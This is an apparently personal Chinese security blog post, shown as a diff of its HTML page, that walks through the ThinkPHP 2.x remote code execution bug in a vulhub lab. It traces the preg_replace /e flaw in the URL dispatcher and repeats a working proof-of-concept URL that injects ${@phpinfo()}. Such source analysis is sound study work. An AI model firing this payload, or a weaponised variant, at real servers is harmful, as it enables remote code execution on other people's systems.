@@ -1,0 +1,837 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ThinkPHP 2.x RCE 的复现过程与源码分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 2.x RCE 漏洞复现与源码分析">
+<meta property="og:url" content="https://xendr1a.github.io/2026/01/24/thinkphp-2x-rce/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ThinkPHP 2.x RCE 的复现过程与源码分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-01-24T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.977Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ThinkPHP 2.x RCE 漏洞复现与源码分析 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ThinkPHP 2.x RCE 漏洞复现与源码分析</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-24 10:00" pubdate>
+          2026年1月24日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.8k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ThinkPHP 2.x RCE 漏洞复现与源码分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近对漏洞的好奇又上来了，就开始在vulhub开始捣鼓了，网上搜大多都是直接复现完就完事了，我还是喜欢看着代码来复现，然后就从docker把源码拔下来看了</p>
+<h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><p>Web 请求首先进入项目入口文件 index.php</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">require(THINK_PATH.&quot;/ThinkPHP.php&quot;);<br>App::run();<br></code></pre></td></tr></table></figure>
+
+<p>我们跟进<code>App::run();</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">static public function run() &#123;<br>        App::init();<br>        // 记录应用初始化时间<br>        if(C(&#x27;SHOW_RUN_TIME&#x27;)) G(&#x27;initTime&#x27;);<br>        App::exec();<br>        // 保存日志记录<br>        if(C(&#x27;LOG_RECORD&#x27;)) Log::save();<br>        return ;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>run()这里会继续调用init()和exec()，这里要注意一个关键点：</p>
+<ul>
+<li>App::init()：负责初始化和 URL 调度</li>
+<li>App::exec()：负责真正去执行控制器方法</li>
+</ul>
+<p>虽然后续真正执行业务逻辑的是 exec()，但这次漏洞在 init() 的 URL 解析阶段就已经触发了。</p>
+<h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>在 <code>App::init() </code>中，会调用<code>Dispatcher::dispatch();</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">static public function init()<br>    &#123;<br>        ...<br>        Dispatcher::dispatch();<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs text">static public function dispatch()<br>    &#123;<br>        $urlMode  =  C(&#x27;URL_MODEL&#x27;);<br>        if($urlMode == URL_REWRITE ) &#123;<br>            //当前项目地址<br>            $url    =   dirname(_PHP_FILE_);<br>            if($url == &#x27;/&#x27; || $url == &#x27;\\&#x27;)<br>                $url    =   &#x27;&#x27;;<br>            define(&#x27;PHP_FILE&#x27;,$url);<br>        &#125;elseif($urlMode == URL_COMPAT)&#123;<br>            define(&#x27;PHP_FILE&#x27;,_PHP_FILE_.&#x27;?&#x27;.C(&#x27;VAR_PATHINFO&#x27;).&#x27;=&#x27;);<br>        &#125;else &#123;<br>            //当前项目地址<br>            define(&#x27;PHP_FILE&#x27;,_PHP_FILE_);<br>        &#125;<br><br>        // 开启子域名部署<br>        if(C(&#x27;APP_SUB_DOMAIN_DEPLOY&#x27;)) &#123;<br>            $rules = C(&#x27;APP_SUB_DOMAIN_RULES&#x27;);<br>            $subDomain    = strtolower(substr($_SERVER[&#x27;HTTP_HOST&#x27;],0,strpos($_SERVER[&#x27;HTTP_HOST&#x27;],&#x27;.&#x27;)));<br>            define(&#x27;SUB_DOMAIN&#x27;,$subDomain); // 二级域名定义<br>            if($subDomain &amp;&amp; array_key_exists($subDomain,$rules)) &#123;<br>                $rule =  $rules[$subDomain];<br>            &#125;elseif(isset($rules[&#x27;*&#x27;]))&#123; // 泛域名支持<br>                if(&#x27;www&#x27; != $subDomain &amp;&amp; !in_array($subDomain,C(&#x27;APP_SUB_DOMAIN_DENY&#x27;))) &#123;<br>                    $rule =  $rules[&#x27;*&#x27;];<br>                &#125;<br>            &#125;<br>            if(!empty($rule)) &#123;<br>                // 子域名部署规则 &#x27;子域名&#x27;=&gt;array(&#x27;分组名/[模块名]&#x27;,&#x27;var1=a&amp;var2=b&#x27;);<br>                $array   =  explode(&#x27;/&#x27;,$rule[0]);<br>                $module = array_pop($array);<br>                if(!empty($module)) &#123;<br>                    $_GET[C(&#x27;VAR_MODULE&#x27;)] = $module;<br>                    $domainModule   =  true;<br>                &#125;<br>                if(!empty($array)) &#123;<br>                    $_GET[C(&#x27;VAR_GROUP&#x27;)]  = array_pop($array);<br>                    $domainGroup =  true;<br>                &#125;<br>                if(isset($rule[1])) &#123; // 传入参数<br>                    parse_str($rule[1],$parms);<br>                    $_GET   =  array_merge($_GET,$parms);<br>                &#125;<br>            &#125;<br>        &#125;<br>        $depr = C(&#x27;URL_PATHINFO_DEPR&#x27;);<br>        // 分析PATHINFO信息<br>        self::getPathInfo();<br><br>        if(!self::routerCheck())&#123;   // 检测路由规则 如果没有则按默认规则调度URL<br>            $paths = explode($depr,trim($_SERVER[&#x27;PATH_INFO&#x27;],&#x27;/&#x27;));<br>            $var  =  array();<br>            if (C(&#x27;APP_GROUP_LIST&#x27;) &amp;&amp; !isset($_GET[C(&#x27;VAR_GROUP&#x27;)]))&#123;<br>                $var[C(&#x27;VAR_GROUP&#x27;)] = in_array(strtolower($paths[0]),explode(&#x27;,&#x27;,strtolower(C(&#x27;APP_GROUP_LIST&#x27;))))? array_shift($paths) : &#x27;&#x27;;<br>                if(C(&#x27;APP_GROUP_DENY&#x27;) &amp;&amp; in_array(strtolower($var[C(&#x27;VAR_GROUP&#x27;)]),explode(&#x27;,&#x27;,strtolower(C(&#x27;APP_GROUP_DENY&#x27;))))) &#123;<br>                    // 禁止直接访问分组<br>                    exit;<br>                &#125;<br>            &#125;<br>            if(!isset($_GET[C(&#x27;VAR_MODULE&#x27;)])) &#123;// 还没有定义模块名称<br>                $var[C(&#x27;VAR_MODULE&#x27;)]  =   array_shift($paths);<br>            &#125;<br>            $var[C(&#x27;VAR_ACTION&#x27;)]  =   array_shift($paths);<br>            // 解析剩余的URL参数<br>            $res = preg_replace(&#x27;@(\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\/]+)@e&#x27;, &#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;, implode($depr,$paths));<br>            $_GET   =  array_merge($var,$_GET);<br>        &#125;<br>...<br></code></pre></td></tr></table></figure>
+
+<p><code>dispatch() </code>的职责是解析 URL，有问题的代码在这</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">$res = preg_replace(&#x27;@(\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\/]+)@e&#x27;, &#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;, implode($depr,$paths));<br>           $_GET   =  array_merge($var,$_GET);<br></code></pre></td></tr></table></figure>
+
+<p><code>/e </code>修饰符会让<code>preg_replace</code>的替换结果不再只是普通字符串，而是作为代码执行。</p>
+<h3 id="Poc是怎么触发的"><a href="#Poc是怎么触发的" class="headerlink" title="Poc是怎么触发的"></a>Poc是怎么触发的</h3><p>我们先看看Poc</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">/index.php?s=/index/index/name/$&#123;@phpinfo()&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在\ThinkPHP\Common\convention.php里面<code>&#39;VAR_PATHINFO&#39;   =&amp;gt; &#39;s&#39;</code>，也就是说s 参数会被当成 PATHINFO来处理。对应代码在 <code>Dispatcher::getPathInfo()：</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text">public static function getPathInfo()<br>    &#123;<br>        if(!empty($_GET[C(&#x27;VAR_PATHINFO&#x27;)])) &#123;<br>            // 兼容PATHINFO 参数<br>            $path = $_GET[C(&#x27;VAR_PATHINFO&#x27;)];<br>            unset($_GET[C(&#x27;VAR_PATHINFO&#x27;)]);<br>        &#125;elseif(!empty($_SERVER[&#x27;PATH_INFO&#x27;]))&#123;<br>            $pathInfo = $_SERVER[&#x27;PATH_INFO&#x27;];<br>            if(0 === strpos($pathInfo,$_SERVER[&#x27;SCRIPT_NAME&#x27;]))<br>                $path = substr($pathInfo, strlen($_SERVER[&#x27;SCRIPT_NAME&#x27;]));<br>            else<br>                $path = $pathInfo;<br>        &#125;elseif(!empty($_SERVER[&#x27;ORIG_PATH_INFO&#x27;])) &#123;<br>            $pathInfo = $_SERVER[&#x27;ORIG_PATH_INFO&#x27;];<br>            if(0 === strpos($pathInfo, $_SERVER[&#x27;SCRIPT_NAME&#x27;]))<br>                $path = substr($pathInfo, strlen($_SERVER[&#x27;SCRIPT_NAME&#x27;]));<br>            else<br>                $path = $pathInfo;<br>        &#125;elseif (!empty($_SERVER[&#x27;REDIRECT_PATH_INFO&#x27;]))&#123;<br>            $path = $_SERVER[&#x27;REDIRECT_PATH_INFO&#x27;];<br>        &#125;elseif(!empty($_SERVER[&quot;REDIRECT_Url&quot;]))&#123;<br>            $path = $_SERVER[&quot;REDIRECT_Url&quot;];<br>            if(empty($_SERVER[&#x27;QUERY_STRING&#x27;]) || $_SERVER[&#x27;QUERY_STRING&#x27;] == $_SERVER[&quot;REDIRECT_QUERY_STRING&quot;])<br>            &#123;<br>                $parsedUrl = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);<br>                if(!empty($parsedUrl[&#x27;query&#x27;])) &#123;<br>                    $_SERVER[&#x27;QUERY_STRING&#x27;] = $parsedUrl[&#x27;query&#x27;];<br>                    parse_str($parsedUrl[&#x27;query&#x27;], $GET);<br>                    $_GET = array_merge($_GET, $GET);<br>                    reset($_GET);<br>                &#125;else &#123;<br>                    unset($_SERVER[&#x27;QUERY_STRING&#x27;]);<br>                &#125;<br>                reset($_SERVER);<br>            &#125;<br>        &#125;<br>        if(C(&#x27;URL_HTML_SUFFIX&#x27;) &amp;&amp; !empty($path)) &#123;<br>            $path = preg_replace(&#x27;/\.&#x27;.trim(C(&#x27;URL_HTML_SUFFIX&#x27;),&#x27;.&#x27;).&#x27;$/&#x27;, &#x27;&#x27;, $path);<br>        &#125;<br>        $_SERVER[&#x27;PATH_INFO&#x27;] = empty($path) ? &#x27;/&#x27; : $path;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">/index.php?s=/index/index/name/$&#123;@phpinfo()&#125;<br></code></pre></td></tr></table></figure>
+
+<p>会被先取出来，然后变成</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$_SERVER[&#x27;PATH_INFO&#x27;] = &#x27;/index/index/name/$&#123;@phpinfo()&#125;&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>接下来 dispatch() 会对这段 PATHINFO 进行拆分：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$paths = explode($depr,trim($_SERVER[&#x27;PATH_INFO&#x27;],&#x27;/&#x27;));<br></code></pre></td></tr></table></figure>
+
+<p>这里 $depr 的值是 &#x2F;，所以结果就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$paths = [&#x27;index&#x27;, &#x27;index&#x27;, &#x27;name&#x27;, &#x27;$&#123;@phpinfo()&#125;&#x27;];<br></code></pre></td></tr></table></figure>
+
+<p>随后框架会按顺序取前两段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">$var[C(&#x27;VAR_MODULE&#x27;)]  = array_shift($paths);<br>$var[C(&#x27;VAR_ACTION&#x27;)]  = array_shift($paths);<br></code></pre></td></tr></table></figure>
+
+<p>第一个 index 会被当成模块名，第二个 index 会被当成操作名，框架后面会把模块名自动补成 IndexAction，最终去找 <code>IndexAction::index()</code>。</p>
+<p>剩下的 <code>name/${@phpinfo()}</code> 则继续作为参数部分处理，其中 <code>name</code> 是参数名，<code>${@phpinfo()}</code> 是参数值。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$res = preg_replace(&#x27;@(\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\/]+)@e&#x27;, &#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;, implode($depr,$paths));<br></code></pre></td></tr></table></figure>
+
+<p>也就是说传入的数据就会变成这样子</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$var[&#x27;name&#x27;]=&quot;$&#123;@phpinfo()&#125;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>关键点在于，这里使用了 &#x2F;e 修饰符。&#x2F;e 的作用不是普通替换，而是会把替换后的结果当成 PHP 代码执行。</p>
+<p>而 <code>${@phpinfo()}</code> 又恰好落在双引号字符串中，会触发 PHP 的复杂变量解析，于是 phpinfo() 被执行，最终造成了远程代码执行。</p>
+<p>整个过程其实可以概括成下面这样：</p>
+<ol>
+<li>请求进入 index.php</li>
+<li>调用 App::run()</li>
+<li>App::init() 中进入 Dispatcher::dispatch()</li>
+<li>s 参数被当成 PATHINFO</li>
+<li>PATHINFO 被拆成模块、操作、参数名、参数值</li>
+<li>参数解析时调用了带 &#x2F;e 的 preg_replace</li>
+<li>用户可控内容被拼进 PHP 代码里执行</li>
+<li>phpinfo() 成功触发，RCE 成立</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ThinkPHP 2.x 这条 RCE 的核心问题，不在业务代码，而在框架底层的 URL 参数解析。<br>框架本意只是想把 PATHINFO 中的剩余内容解析成普通参数，但由于 <code>preg_replace</code> 使用了 <code>/e</code> 修饰符，用户可控输入最终被拼接进可执行代码中，导致远程代码执行。</p>
+<p>怎么说呢，看代码利用过程还是很爽的有一种闯关的感觉。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/" class="category-chain-item">CVE复现</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/ThinkPHP/" class="print-no-link">#ThinkPHP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ThinkPHP 2.x RCE 漏洞复现与源码分析</div>
+      <div>https://xendr1a.github.io/2026/01/24/thinkphp-2x-rce/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/02/07/yii-deserialization/" title="Yii 反序列化漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Yii 反序列化漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/10/laravel-deserialization/" title="Laravel 反序列化漏洞复现">
+                        <span class="hidden-mobile">Laravel 反序列化漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
